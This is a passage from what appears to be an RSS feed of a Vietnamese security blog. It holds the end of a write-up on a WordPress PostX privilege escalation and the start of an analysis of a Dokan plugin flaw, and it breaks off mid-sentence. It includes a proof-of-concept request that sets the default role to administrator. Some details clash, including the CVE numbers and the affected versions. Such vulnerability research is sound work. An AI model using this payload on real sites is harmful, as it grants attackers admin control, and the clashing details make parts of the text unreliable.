2&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1&#xA;Host: localhost&#xA;Cookie: editor_cookie &#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;type=set&amp;amp;key=default_role&amp;amp;data=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-05-cve-2025-55707/default.png&#34; title=&#34;Default role&#34; data-thumbnail=&#34;/posts/2026-01-05-cve-2025-55707/default.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Default role&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-05-cve-2025-55707/default.png&#39; alt=&#34;Result&#34; height=&#34;883&#34; width=&#34;1485&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Default role&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Tạo user mới và login&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng CVE-2025-53425 xuất phát từ việc &lt;strong&gt;kết hợp không nhất quán giữa kiểm soát quyền ở mức REST API và logic xử lý trong callback&lt;/strong&gt;. Mặc dù endpoint REST chỉ yêu cầu quyền &lt;code&gt;edit_posts&lt;/code&gt;, nhưng hành vi nguy hiểm nhất (&lt;code&gt;update_option()&lt;/code&gt;) lại được bảo vệ bằng &lt;code&gt;edit_others_posts&lt;/code&gt;, cho phép &lt;strong&gt;Editor&lt;/strong&gt; thực hiện các thay đổi nhạy cảm trong bảng &lt;code&gt;wp_options&lt;/code&gt;. Khi kết hợp với REST API nonce hợp lệ, một Editor có thể lợi dụng endpoint này để thay đổi các option quan trọng, dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt;. Bản vá ở phiên bản &lt;code&gt;4.1.36&lt;/code&gt; đã khắc phục triệt để vấn đề bằng cách giới hạn endpoint chỉ cho người dùng có quyền &lt;code&gt;manage_options&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;permission_callback&lt;/code&gt; phải &lt;strong&gt;phản ánh chính xác mức độ nhạy cảm của hành vi trong callback&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;update_option()&lt;/code&gt; là hàm &lt;strong&gt;rất nguy hiểm&lt;/strong&gt; nếu không bị giới hạn quyền chặt chẽ&lt;/li&gt;&#xA;&lt;li&gt;REST API nonce &lt;strong&gt;chỉ chống CSRF&lt;/strong&gt;, không thay thế cho kiểm soát phân quyền&lt;/li&gt;&#xA;&lt;li&gt;Editor &lt;strong&gt;không nên&lt;/strong&gt; được phép thay đổi các global option ảnh hưởng đến toàn hệ thống&lt;/li&gt;&#xA;&lt;li&gt;Vá lỗi hiệu quả nhất là &lt;strong&gt;đặt quyền cao ngay từ REST endpoint&lt;/strong&gt;, thay vì kiểm tra rải rác trong callback&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ultimate-post/vulnerability/wordpress-postx-plugin-4-1-35-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PostX Plugin &amp;lt;= 4.1.35 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53425 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-04-cve-2025-53425/</link>
      <pubDate>Sun, 04 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-04-cve-2025-53425/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Gán Quyền Không Chính Xác&lt;/strong&gt; (&lt;strong&gt;Incorrect Privilege Assignment&lt;/strong&gt;) trong &lt;strong&gt;Dokan, Inc. Dokan dokan-lite&lt;/strong&gt; cho phép &lt;strong&gt;Leo Thang Đặc Quyền&lt;/strong&gt; (&lt;strong&gt;Privilege Escalation&lt;/strong&gt;). Vấn đề này ảnh hưởng đến &lt;strong&gt;Dokan&lt;/strong&gt; từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;&amp;lt;= 4.1.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53425&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53425&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Shop manager&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/dokan-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Dokan Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Dokan&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt; → &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Plugin &lt;strong&gt;cần WooCommerce để hoạt động&lt;/strong&gt;, vì nó &lt;strong&gt;tích hợp và hoạt động trực tiếp với WooCommerce&lt;/strong&gt; nhằm quản lý &lt;strong&gt;sản phẩm, đơn hàng và quy trình thanh toán&lt;/strong&gt; một cách đầy đủ và hiệu quả.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_dokan_save_settings&amp;#39;, [ $this, &amp;#39;save_settings_value&amp;#39; ], 10 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; là hook dành cho người dùng &lt;strong&gt;đã đăng nhập&lt;/strong&gt;.&#xA;Khi có request đến endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=dokan_save_settings&lt;/code&gt; thì callback &lt;code&gt;save_settings_value&lt;/code&gt; sẽ được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function save_settings_value() {&#xA;    try {&#xA;        if ( ! current_user_can( &amp;#39;manage_woocommerce&amp;#39; ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_unauthorized_operation&amp;#39;, __( &amp;#39;You are not authorized to perform this action.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 401 );&#xA;        }&#xA;&#xA;        if ( ! isset( $_POST[&amp;#39;nonce&amp;#39;] ) || ! wp_verify_nonce( sanitize_key( wp_unslash( $_POST[&amp;#39;nonce&amp;#39;] ) ), &amp;#39;dokan_admin&amp;#39; ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_invalid_nonce&amp;#39;, __( &amp;#39;Invalid nonce&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 403 );&#xA;        }&#xA;&#xA;        if ( empty( $_POST[&amp;#39;section&amp;#39;] ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_error_saving&amp;#39;, __( &amp;#39;`section` parameter is required.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 400 );&#xA;        }&#xA;&#xA;        $option_name  = sanitize_text_field( wp_unslash( $_POST[&amp;#39;section&amp;#39;] ) );&#xA;        $option_value = $this-&amp;gt;sanitize_options( wp_unslash( $_POST[&amp;#39;settingsData&amp;#39;] ), &amp;#39;edit&amp;#39; ); // phpcs:ignore&#xA;        $option_value = apply_filters( &amp;#39;dokan_save_settings_value&amp;#39;, $option_value, $option_name );&#xA;        $old_options  = get_option( $option_name, [] );&#xA;&#xA;        /**&#xA;         * @since 3.5.1 added $old_options parameter&#xA;         */&#xA;        do_action( &amp;#39;dokan_before_saving_settings&amp;#39;, $option_name, $option_value, $old_options );&#xA;&#xA;        update_option( $option_name, $option_value );&#xA;&#xA;        /**&#xA;         * @since 3.5.1 added $old_options parameter&#xA;         */&#xA;        do_action( &amp;#39;dokan_after_saving_settings&amp;#39;, $option_name, $option_value, $old_options );&#xA;&#xA;        // only flush rewrite rules if store url has been changed&#xA;        if ( &amp;#39;dokan_general&amp;#39; === $option_name &amp;amp;&amp;amp; isset( $old_options[&amp;#39;custom_store_url&amp;#39;] ) &amp;amp;&amp;amp; $old_options[&amp;#39;custom_store_url&amp;#39;] !== $option_value[&amp;#39;custom_store_url&amp;#39;] ) {&#xA;            dokan()-&amp;gt;rewrite-&amp;gt;register_rule();&#xA;            flush_rewrite_rules();&#xA;        }&#xA;&#xA;        wp_send_json_success(&#xA;            [&#xA;                &amp;#39;settings&amp;#39; =&amp;gt; [&#xA;                    &amp;#39;name&amp;#39;  =&amp;gt; $option_name,&#xA;                    &amp;#39;value&amp;#39; =&amp;gt; apply_filters( &amp;#39;dokan_get_settings_values&amp;#39;, $this-&amp;gt;sanitize_options( $option_value, &amp;#39;read&amp;#39; ), $option_name ),&#xA;                ],&#xA;                &amp;#39;message&amp;#39;  =&amp;gt; __( &amp;#39;Setting has been saved successfully.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ),&#xA;            ]&#xA;        );&#xA;    } catch ( Exception $e ) {&#xA;        $error_code = $e-&amp;gt;getCode() ? $e-&amp;gt;getCode() : 422;&#xA;&#xA;        wp_send_json_error( new WP_Error( &amp;#39;dokan_settings_error&amp;#39;, $e-&amp;gt;getMessage() ), $error_code );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện kiểm tra quyền người dùng bằng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;current_user_can( &amp;#39;manage_woocommerce&amp;#39; )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đó, &lt;code&gt;manage_woocommerce&lt;/code&gt; là một &lt;strong&gt;capability&lt;/strong&gt; được đăng ký bởi plugin &lt;strong&gt;WooCommerce&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Quyền này được khai báo trong hàm &lt;code&gt;get_core_capabilities()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_core_capabilities() {&#xA;    $capabilities = array();&#xA;&#xA;    $capabilities[&amp;#39;core&amp;#39;] = array(&#xA;        &amp;#39;manage_woocommerce&amp;#39;,&#xA;        &amp;#39;create_customers&amp;#39;,&#xA;        &amp;#39;view_woocommerce_reports&amp;#39;,&#xA;    );&#xA;&#xA;    $capability_types = array( &amp;#39;product&amp;#39;, &amp;#39;shop_order&amp;#39;, &amp;#39;shop_coupon&amp;#39; );&#xA;&#xA;    foreach ( $capability_types as $capability_type ) {&#xA;&#xA;        $capabilities[ $capability_type ] = array(&#xA;            // Post type.&#xA;            &amp;#34;edit_{$capability_type}&amp;#34;,&#xA;            &amp;#34;read_{$capability_type}&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}&amp;#34;,&#xA;            &amp;#34;edit_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_others_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;publish_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;read_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_published_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_others_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_published_{$capability_type}s&amp;#34;,&#xA;&#xA;            // Terms.&#xA;            &amp;#34;manage_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;edit_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;assign_{$capability_type}_terms&amp;#34;,&#xA;        );&#xA;    }&#xA;&#xA;    return $capabilities;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này định nghĩa &lt;strong&gt;các quyền cốt lõi của WooCommerce&lt;/strong&gt;, trong đó nhóm &lt;code&gt;core&lt;/code&gt; bao gồm các quyền quan trọng như:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;create_customers&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;view_woocommerce_reports&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Các quyền này sau đó được sử dụng trong hàm &lt;code&gt;create_roles()&lt;/code&gt; để gán cho các vai trò người dùng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function create_roles() {&#xA;    ...&#xA;    // Shop manager role.&#xA;    add_role(&#xA;        &amp;#39;shop_manager&amp;#39;,&#xA;        &amp;#39;Shop manager&amp;#39;,&#xA;        array(&#xA;            &amp;#39;level_9&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_8&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_7&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_6&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_5&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_4&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_3&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_2&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_1&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_0&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;read&amp;#39;                   =&amp;gt; true,&#xA;            &amp;#39;read_private_pages&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;read_private_posts&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_posts&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_pages&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_published_posts&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;edit_published_pages&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;edit_private_pages&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_private_posts&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_others_posts&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;edit_others_pages&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;publish_posts&amp;#39;          =&amp;gt; true,&#xA;            &amp;#39;publish_pages&amp;#39;          =&amp;gt; true,&#xA;            &amp;#39;delete_posts&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;delete_pages&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;delete_private_pages&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;delete_private_posts&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;delete_published_pages&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;delete_published_posts&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;delete_others_posts&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;delete_others_pages&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;manage_categories&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;manage_links&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;moderate_comments&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;upload_files&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;export&amp;#39;                 =&amp;gt; true,&#xA;            &amp;#39;import&amp;#39;                 =&amp;gt; true,&#xA;            &amp;#39;list_users&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_theme_options&amp;#39;     =&amp;gt; true,&#xA;        )&#xA;    );&#xA;&#xA;    $capabilities = self::get_core_capabilities();&#xA;&#xA;    foreach ( $capabilities as $cap_group ) {&#xA;        foreach ( $cap_group as $cap ) {&#xA;            $wp_roles-&amp;gt;add_cap( &amp;#39;shop_manager&amp;#39;, $cap );&#xA;            $wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, $cap );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này tạo và cấu hình các vai trò người dùng, trong đó &lt;strong&gt;role &lt;code&gt;shop_manager&lt;/code&gt;&lt;/strong&gt; được cấp rất nhiều quyền cao, gần tương đương với &lt;strong&gt;administrator&lt;/strong&gt;, bao gồm:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Quản lý bài viết, trang và bình luận&lt;/li&gt;&#xA;&lt;li&gt;Upload file, import/export&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_theme_options&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau đó, &lt;strong&gt;toàn bộ quyền WooCommerce&lt;/strong&gt; được khai báo trong &lt;code&gt;get_core_capabilities()&lt;/code&gt; tiếp tục được gán thêm 